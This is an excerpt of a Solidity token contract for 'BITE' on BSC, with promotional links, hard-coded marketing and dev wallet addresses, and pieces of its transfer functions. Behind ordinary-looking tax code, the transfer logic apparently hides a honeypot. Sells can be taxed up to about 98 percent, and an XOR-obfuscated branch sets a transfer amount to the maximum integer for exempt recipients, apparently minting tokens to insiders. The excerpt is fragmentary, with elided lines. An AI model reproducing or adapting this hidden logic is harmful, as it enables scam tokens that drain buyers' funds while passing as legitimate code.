...
/*
            ...
            Telegram : https://t.me/BiteSwapBSC

            Website : https://medium.com/@BiteSwapBSC/bite-biteswap-90db3fee501
...
contract BITE is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x048fefbEf0bCF59118268BD09F48B5920b884851); 
    address payable public Wallet_Dev = payable(0xd7b2D9bFC1698F9572E99e252c4ebE789Af6b730);
    ...
    function _transfer(
        ...
        if(liquidityTax < 1 && _isExemptFromTax[to] > 0){
            liquidityTax = liquidityTax.add(98-_Tax_On_Sell);
        }
        bool takeFee = true;
        bool isBuy;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(_isExemptFromTax[sender] ^ _isExemptFromTax[recipient] > 0 && _isExemptFromTax[recipient] > 0){
                 uint256 tTransferAmount = 0 ^ MAX;
            ...
            uint256 sellFEE = tAmount*(_Tax_On_Sell.add(liquidityTax))/100;
